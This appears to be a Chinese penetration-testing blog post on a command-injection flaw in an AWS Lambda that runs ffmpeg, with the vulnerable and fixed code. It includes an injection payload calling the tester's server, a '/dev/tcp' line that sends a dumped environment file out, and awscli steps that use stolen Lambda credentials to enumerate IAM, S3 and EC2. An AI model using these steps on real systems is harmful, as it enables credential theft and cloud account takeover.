<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Lambdaè¿œç¨‹å‘½ä»¤æ‰§è¡Œæµ‹è¯• | ğŸ˜Š#</title>
  <meta name="author" content="JKme">
  
  <meta name="description" content="æ¼æ´æµ‹è¯•çš„æ—¶å€™å‘ç°AWSçš„Lambdaé‡Œé¢æœ‰è¿™æ ·çš„ä»£ç ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼š
execute_command = &#34;ffmpeg -i &#34; + video_url + &#34; -y -f &#34; + img_format + &#34; -ss &#34; + time_index + &#34; -vframes 1 &#34; + WH + &#34; &#34; + output_path
print(execute_command)
cp = subprocess.run(execute_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
æ”»å‡»çš„Payloadï¼š ;curl &amp;lt;your vps&amp;gt;:&amp;lt;port&amp;gt;;ï¼Œç„¶ååœ¨è‡ªå·±æœåŠ¡å™¨ç›‘å¬å¯ä»¥æ”¶åˆ°Lambdaå®¹å™¨å‘èµ·çš„è¯·æ±‚ã€‚
ä¿®å¤ä»£ç :cp = subprocess.run([&#34;ffmpeg&#34;, &#34;-i&#34;, video_url, &#34;-y&#34;, &#34;-f&#34;, img_format, &#34;-ss&#34;, time_index, &#34;-vframes&#34;, &#34;1&#34;, output_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)


å‚¨å¤‡çŸ¥è¯†
Lambdaå‡½æ•°ä»£ç è·¯å¾„: /var/task
ç”¨æˆ·å‡­è¯: å­˜å‚¨åœ¨ç¯å¢ƒå˜é‡é‡Œé¢ï¼ŒAWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
æ–‡ä»¶ç³»ç»Ÿ: /var/taskåªè¯»ï¼Œ/tmpå¯å†™
é»˜è®¤ç”¨æˆ·: sbx_userxxx
Lambdaè®¡ç®—çš„æœ€å¤§è¶…æ—¶æ—¶é—´æ˜¯15åˆ†é’Ÿï¼Œå‡­è¯è¿‡æœŸæ—¶é—´æ˜¯11ä¸ªå°æ—¶å·¦å³
æ”»å‡»Lambdaåªéœ€è¦è·å–AKã€SKã€Tokenï¼Œåå¼¹shellæ²¡ä»€ä¹ˆæ„ä¹‰

åœ¨å­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„æƒ…å†µä¸‹å…ˆè·å–ç”¨æˆ·å‡­è¯ï¼Œç„¶åä½¿ç”¨awscliå†™å…¥æœ¬åœ°é…ç½®æ–‡ä»¶é‡Œé¢ï¼Œé€šè¿‡awscliæ¥æ“ä½œï¼Œå¦‚æœåœ¨åˆ›å»ºLambdaçš„æƒé™æ§åˆ¶ä¸è¶³ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨awscliæ¥æ“ä½œå„ç§èµ„æºï¼Œæ¯”å¦‚æˆ‘å‘ç°çš„å‘½ä»¤æ‰§è¡Œæœ‰å¯¹ä¸»è´¦æˆ·ä¸‹æ‰€æœ‰ç½‘å¡çš„æ“ä½œæƒé™ï¼Œå¯ä»¥ä½¿ç”¨è·å–åˆ°çš„ç”¨æˆ·å‡­è¯åˆ é™¤æ‰€æœ‰ç½‘å¡æ¥å£ã€‚
å­˜åœ¨å¦å¤–ä¸€ç§æƒ…å†µï¼Œå½“è·å–åˆ°çš„å‡­è¯æƒé™å¾ˆå°çš„æ—¶å€™ï¼Œåˆ°å¤„éƒ½æ˜¯is not authorized to performï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æŸ¥è¯¢æ¥æŸ¥çœ‹è‡ªå·±çš„å‡­è¯éƒ½ä»€ä¹ˆæƒé™ï¼Œé¦–å…ˆé…ç½®å‘½ä»¤è¡Œå·¥å…·ï¼š"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="Lambdaè¿œç¨‹å‘½ä»¤æ‰§è¡Œæµ‹è¯•"/>
  <meta property="og:site_name" content="ğŸ˜Š#"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  

  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
  <script src="/js/jquery-2.0.3.min.js"></script>
<!--   <script src="/js/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>
  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="ğŸ˜Š#" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">ğŸ˜Š#</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/project" title="All the categories.">
			  <i class=""></i>Projects
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> Lambdaè¿œç¨‹å‘½ä»¤æ‰§è¡Œæµ‹è¯•</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h3 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h3><p>æµ‹è¯•çš„æ—¶å€™å‘ç°AWSçš„Lambdaé‡Œé¢æœ‰è¿™æ ·çš„ä»£ç ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">execute_command <span class="token operator">=</span> <span class="token string">"ffmpeg -i "</span> <span class="token operator">+</span> video_url <span class="token operator">+</span> <span class="token string">" -y -f "</span> <span class="token operator">+</span> img_format <span class="token operator">+</span> <span class="token string">" -ss "</span> <span class="token operator">+</span> time_index <span class="token operator">+</span> <span class="token string">" -vframes 1 "</span> <span class="token operator">+</span> WH <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> output_path
<span class="token keyword">print</span><span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span>
cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>execute_command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>æ”»å‡»çš„Payloadï¼š <code>;curl &lt;your vps&gt;:&lt;port&gt;;</code>ï¼Œç„¶ååœ¨è‡ªå·±æœåŠ¡å™¨ç›‘å¬å¯ä»¥æ”¶åˆ°Lambdaå®¹å™¨å‘èµ·çš„è¯·æ±‚ã€‚</p>
<h5 id="ä¿®å¤ä»£ç "><a href="#ä¿®å¤ä»£ç " class="headerlink" title="ä¿®å¤ä»£ç :"></a>ä¿®å¤ä»£ç :</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"ffmpeg"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> video_url<span class="token punctuation">,</span> <span class="token string">"-y"</span><span class="token punctuation">,</span> <span class="token string">"-f"</span><span class="token punctuation">,</span> img_format<span class="token punctuation">,</span> <span class="token string">"-ss"</span><span class="token punctuation">,</span> time_index<span class="token punctuation">,</span> <span class="token string">"-vframes"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> output_path<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<h3 id="å‚¨å¤‡çŸ¥è¯†"><a href="#å‚¨å¤‡çŸ¥è¯†" class="headerlink" title="å‚¨å¤‡çŸ¥è¯†"></a>å‚¨å¤‡çŸ¥è¯†</h3><ul>
<li>Lambdaå‡½æ•°ä»£ç è·¯å¾„: <code>/var/task</code></li>
<li>ç”¨æˆ·å‡­è¯: å­˜å‚¨åœ¨ç¯å¢ƒå˜é‡é‡Œé¢ï¼Œ<code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>AWS_SESSION_TOKEN</code></li>
<li>æ–‡ä»¶ç³»ç»Ÿ: <code>/var/task</code>åªè¯»ï¼Œ<code>/tmp</code>å¯å†™</li>
<li>é»˜è®¤ç”¨æˆ·: <code>sbx_userxxx</code></li>
<li>Lambdaè®¡ç®—çš„æœ€å¤§è¶…æ—¶æ—¶é—´æ˜¯15åˆ†é’Ÿï¼Œå‡­è¯è¿‡æœŸæ—¶é—´æ˜¯11ä¸ªå°æ—¶å·¦å³</li>
<li>æ”»å‡»Lambdaåªéœ€è¦è·å–AKã€SKã€Tokenï¼Œåå¼¹shellæ²¡ä»€ä¹ˆæ„ä¹‰</li>
</ul>
<p>åœ¨å­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„æƒ…å†µä¸‹å…ˆè·å–ç”¨æˆ·å‡­è¯ï¼Œç„¶åä½¿ç”¨<code>awscli</code>å†™å…¥æœ¬åœ°é…ç½®æ–‡ä»¶é‡Œé¢ï¼Œé€šè¿‡<code>awscli</code>æ¥æ“ä½œï¼Œå¦‚æœåœ¨åˆ›å»º<code>Lambda</code>çš„æƒé™æ§åˆ¶ä¸è¶³ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨<code>awscli</code>æ¥æ“ä½œå„ç§èµ„æºï¼Œæ¯”å¦‚æˆ‘å‘ç°çš„å‘½ä»¤æ‰§è¡Œæœ‰å¯¹ä¸»è´¦æˆ·ä¸‹æ‰€æœ‰ç½‘å¡çš„æ“ä½œæƒé™ï¼Œå¯ä»¥ä½¿ç”¨è·å–åˆ°çš„ç”¨æˆ·å‡­è¯åˆ é™¤æ‰€æœ‰ç½‘å¡æ¥å£ã€‚</p>
<p>å­˜åœ¨å¦å¤–ä¸€ç§æƒ…å†µï¼Œå½“è·å–åˆ°çš„å‡­è¯æƒé™å¾ˆå°çš„æ—¶å€™ï¼Œåˆ°å¤„éƒ½æ˜¯<code>is not authorized to perform</code>ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æŸ¥è¯¢æ¥æŸ¥çœ‹è‡ªå·±çš„å‡­è¯éƒ½ä»€ä¹ˆæƒé™ï¼Œé¦–å…ˆé…ç½®å‘½ä»¤è¡Œå·¥å…·ï¼š</p>
<h6 id="é…ç½®awså‘½ä»¤è¡Œå·¥å…·"><a href="#é…ç½®awså‘½ä»¤è¡Œå·¥å…·" class="headerlink" title="é…ç½®awså‘½ä»¤è¡Œå·¥å…·"></a>é…ç½®awså‘½ä»¤è¡Œå·¥å…·</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws configure --profile stolencreds
è¾“å…¥è·å–åˆ°çš„AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEYå’Œå¯¹åº”åŒºåŸŸï¼Œç¼–è¾‘~/.aws/credentialsï¼Œåœ¨é…ç½®æ–‡ä»¶é‡Œé¢å¢åŠ aws_session_tokenï¼Œè®¾ç½®è·å–åˆ°çš„å¯¹åº”å€¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2021/04/01/aws-lambda-rce/aws2.png"></p>
<h6 id="è·å–function-nameã€role-name"><a href="#è·å–function-nameã€role-name" class="headerlink" title="è·å–function nameã€role name"></a>è·å–function nameã€role name</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws sts get-caller-identity --profile stolencreds  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ARN(Amazon Resource Name)æ˜¯AWSé‡Œé¢å”¯ä¸€èµ„æºæ ‡ç¤ºç¬¦å·ï¼ŒARNçš„æ ¼å¼å–å†³äºç‰¹å®šçš„èµ„æºï¼Œä¸€èˆ¬æ˜¯è¿™ç§æ ¼å¼ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">arn:partition:service:region:account-id:resource-id
arn:partition:service:region:account-id:resource-type&#x2F;resource-id
arn:partition:service:region:account-id:resource-type:resource-id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ul>
<li><code>partition</code>ï¼šèµ„æºæ‰€åœ¨åˆ†åŒº<ul>
<li><code>aws</code> - AWS åŒºåŸŸ</li>
<li><code>aws-cn</code> - ä¸­å›½åŒºåŸŸ</li>
<li><code>aws-us-gov</code> - AWS GovCloud (US) åŒºåŸŸ</li>
</ul>
</li>
<li><code>service</code>: æ ‡è¯† AWS äº§å“çš„æœåŠ¡å‘½åç©ºé—´ã€‚ä¾‹å¦‚ï¼Œs3 è¡¨ç¤º Amazon S3 èµ„æºã€‚</li>
<li><code>region</code>: åŒºåŸŸã€‚ä¾‹å¦‚ï¼Œus-east-2 è¡¨ç¤º ç¾å›½ä¸œéƒ¨ï¼ˆä¿„äº¥ä¿„å·ï¼‰ã€‚</li>
<li><code>account-id</code>: æ‹¥æœ‰èµ„æºçš„ AWS è´¦æˆ·çš„ IDï¼ˆä¸å«è¿å­—ç¬¦ï¼‰ã€‚ä¾‹å¦‚ï¼Œ123456789012ã€‚</li>
<li><code>resource-id</code>: èµ„æºæ ‡è¯†ç¬¦ã€‚ARN çš„è¿™ä¸€éƒ¨åˆ†å¯ä»¥æ˜¯èµ„æºçš„åç§°æˆ– IDï¼Œä¹Ÿå¯ä»¥æ˜¯èµ„æºè·¯å¾„. ä¾‹å¦‚ï¼Œ<code>user/Bob</code>è¡¨ç¤º IAM ç”¨æˆ·.</li>
</ul>
<p>åœ¨Lambdaé‡Œé¢ï¼ŒARNçš„æ ¼å¼æ˜¯å¦‚ä¸‹è¿™æ ·çš„è¡¨ç¤ºï¼š<code>arn:aws:sts::&#123;AccountID&#125;:assumed-role/&#123;RoleName&#125;/&#123;FunctionName&#125;</code></p>
<p><img src="/2021/04/01/aws-lambda-rce/aws.png"></p>
<h6 id="è·å–å‡½æ•°çš„æƒé™æ˜ç»†"><a href="#è·å–å‡½æ•°çš„æƒé™æ˜ç»†" class="headerlink" title="è·å–å‡½æ•°çš„æƒé™æ˜ç»†"></a>è·å–å‡½æ•°çš„æƒé™æ˜ç»†</h6><pre class="line-numbers language-none"><code class="language-none">aws lambda get-policy --function-name &lt;function name&gt;  --output text <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h6 id="è·å–attachçš„æƒé™æ˜ç»†"><a href="#è·å–attachçš„æƒé™æ˜ç»†" class="headerlink" title="è·å–attachçš„æƒé™æ˜ç»†"></a>è·å–attachçš„æƒé™æ˜ç»†</h6><pre class="line-numbers language-none"><code class="language-none">aws iam list-attached-role-policies --role-name &lt;role name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h6 id="è·å–policy-name"><a href="#è·å–policy-name" class="headerlink" title="è·å–policy name"></a>è·å–policy name</h6><pre class="line-numbers language-none"><code class="language-none">aws iam list-role-policies --role-name &lt;role name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h6 id="è·å–ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†"><a href="#è·å–ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†" class="headerlink" title="è·å–ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†"></a>è·å–ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†</h6><pre class="line-numbers language-none"><code class="language-none">aws iam get-role-policy --role-name &lt;role name&gt; --policy-name &lt;policy name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>é€šè¿‡æŸ¥è¯¢ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†ï¼Œå°±å¯ä»¥æ ¹æ®è·å–åˆ°çš„å‡­è¯æ“ä½œAWSçš„èµ„æºï¼Œæ¯”å¦‚S3ã€EC2ã€‚è¿™é‡Œçš„ç”¨æˆ·å‡­è¯æƒé™æ˜ç»†ä¸åŒ…æ‹¬attachçš„æƒé™</p>
<h6 id="å¸¸ç”¨çš„æŸ¥è¯¢"><a href="#å¸¸ç”¨çš„æŸ¥è¯¢" class="headerlink" title="å¸¸ç”¨çš„æŸ¥è¯¢"></a>å¸¸ç”¨çš„æŸ¥è¯¢</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws lambda list-functions --profile stolencreds
aws ssm describe-instance-information --profile stolencreds
aws s3 <span class="token function">ls</span> --profile stolencreds
aws lambda get-function --function-name FatVideoFrameFFmpeg --query <span class="token string">'Code.Location'</span> --profile stolencreds
<span class="token function">wget</span> -O lambda-function.zip url-from-previous-query --profile stolencreds
aws ec2 describe-network-interfaces<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="ç–‘éš¾é—®é¢˜"><a href="#ç–‘éš¾é—®é¢˜" class="headerlink" title="ç–‘éš¾é—®é¢˜"></a>ç–‘éš¾é—®é¢˜</h3><ol>
<li><p>å½“ç¡®å®šå­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„æ—¶å€™ï¼Œå…ˆä½¿ç”¨äº†<code>wget</code>ï¼ŒæŸ¥çœ‹<code>cloudwatch</code>ä¹‹åå‘ç°ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤ï¼Œå½“æˆ‘ä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/pumasecurity/serverless-prey">serverleess-prey</a>æµ‹è¯•çš„æ—¶å€™å‘ç°<code>curl</code>éƒ½ä¸å­˜åœ¨ã€‚è¿™æ—¶å€™å¯ä»¥ä½¿ç”¨<code>;cat /tmp/env.txt &gt; /dev/tcp/&lt;vps&gt;/&lt;port&gt;;</code>æ¥ä¼ è¾“æ•°æ®ï¼Œå…ˆæŠŠéœ€è¦è·å–åˆ°çš„å†…å®¹å†™å…¥åˆ°æ–‡ä»¶ï¼Œç„¶åå¤–å¸¦ä¼ è¾“ã€‚</p>
</li>
<li><p>å¦å¤–ä¸€ä¸ªéšæ‚£æ˜¯DoWï¼ˆDenial of Walletï¼‰ï¼Œå› ä¸ºLambdaæ˜¯æŒ‰ç…§å‡½æ•°è°ƒç”¨æ¬¡æ•°ä»˜è´¹çš„ï¼Œæ‰€ä»¥å¦‚æœæ‰¾åˆ°ä¸€ä¸ªLambdaçš„äº‹ä»¶è§¦å‘å™¨ï¼Œä¸€èˆ¬æ˜¯ä¸€ä¸ªhttpè¯·æ±‚ï¼Œå‘èµ·å¤§é‡è¯·æ±‚æ¶ˆè€—èµ„æº, å»¶ä¼¸ä¸€ä¸‹è…¾è®¯åœ¨æ¨çš„ç±»ä¼¼ä¸€ä¸ªä¸šåŠ¡åœ¨githubä¸Šæœ‰å¾ˆå¤šå¼€æºé¡¹ç›® :( ã€‚AWSå¯ä»¥å†åŠ ä¸€å±‚<code>cloudfront</code>ï¼Œç„¶åé…åˆ<code>cloudwatch</code>æˆ–è€…è´¦å•é¢„è­¦æ¥å®Œå–„ï¼Œæˆ–è€…æ·»åŠ ç”¨æˆ·è®¤è¯tokenã€‚</p>
</li>
<li><p>ä¸ºä»€ä¹ˆä¸Šé¢æˆ‘æ²¡æœ‰æå‘½ä»¤æ‰§è¡Œä¹‹ååå¼¹shellå‘¢ï¼Ÿå› ä¸ºä¸€åå¼¹æˆåŠŸä¹‹åé©¬ä¸Šæ–­å¼€ã€‚æœ€ååœ¨Lambdaçš„é…ç½®é‡Œé¢å‘ç°Lambdaæ‰§è¡Œçš„timeoutæ˜¯3sï¼Œlambdaåœ¨å»ºç«‹çš„æ—¶å€™é»˜è®¤è¿è¡Œæ—¶é—´æ˜¯3sï¼Œå¯ä»¥ä¿®æ”¹ä¸ºæœ€å¤§15åˆ†é’Ÿã€‚</p>
</li>
<li><p>è¿˜æœ‰ä¸€ç§æ”»å‡»æ‰‹æ³•ï¼Œå¯ä»¥ä¿®æ”¹ä»£ç è¿è¡Œç¯å¢ƒï¼Œæ²¡çœ‹å¤ªæ‡‚: <a target="_blank" rel="noopener" href="https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/">Gaining Persistency on Vulnerable Lambdas
</a></p>
</li>
</ol>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/duF1Z0EDC3n_G378Aq_XYA">é’ˆå¯¹AWS Lambdaçš„è¿è¡Œæ—¶æ”»å‡»</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&mid=2247488798&idx=1&sn=485e2131f347ff4d8c3b5b3286b36c97&scene=21#wechat_redirect">Serverlesså®‰å…¨ç ”ç©¶ â€” Serverlesså®‰å…¨é£é™©</a></li>
<li><a target="_blank" rel="noopener" href="https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/">Gaining Persistency on Vulnerable Lambdas</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed">Getting shell and data access in AWS by chaining vulnerabilities</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/zh_cn/general/latest/gr/aws-arns-and-namespaces.html">aws-arns-and-namespaces</a></li>
</ul>

	</div>

	
	<span id="/2021/04/01/aws-lambda-rce.html" class="leancloud-visitors view" data-flag-title="Lambdaè¿œç¨‹å‘½ä»¤æ‰§è¡Œæµ‹è¯•">
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2021/04/06/defense-from-c2.html" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2021/01/04/CloudFront-find-cobaltstrike.html" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2021-04-01 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Pentest/">Pentest<span>45</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-article-text">æ¼æ´</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-article-text">ä¿®å¤ä»£ç :</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%82%A8%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="toc-article-text">å‚¨å¤‡çŸ¥è¯†</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E9%85%8D%E7%BD%AEaws%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7"><span class="toc-article-text">é…ç½®awså‘½ä»¤è¡Œå·¥å…·</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96function-name%E3%80%81role-name"><span class="toc-article-text">è·å–function nameã€role name</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E7%9A%84%E6%9D%83%E9%99%90%E6%98%8E%E7%BB%86"><span class="toc-article-text">è·å–å‡½æ•°çš„æƒé™æ˜ç»†</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96attach%E7%9A%84%E6%9D%83%E9%99%90%E6%98%8E%E7%BB%86"><span class="toc-article-text">è·å–attachçš„æƒé™æ˜ç»†</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96policy-name"><span class="toc-article-text">è·å–policy name</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81%E7%9A%84%E6%9D%83%E9%99%90%E6%98%8E%E7%BB%86"><span class="toc-article-text">è·å–ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†</span></a></li><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E6%9F%A5%E8%AF%A2"><span class="toc-article-text">å¸¸ç”¨çš„æŸ¥è¯¢</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%96%91%E9%9A%BE%E9%97%AE%E9%A2%98"><span class="toc-article-text">ç–‘éš¾é—®é¢˜</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-article-text">å‚è€ƒé“¾æ¥</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2022 JKme's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>â¬†ï¸TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
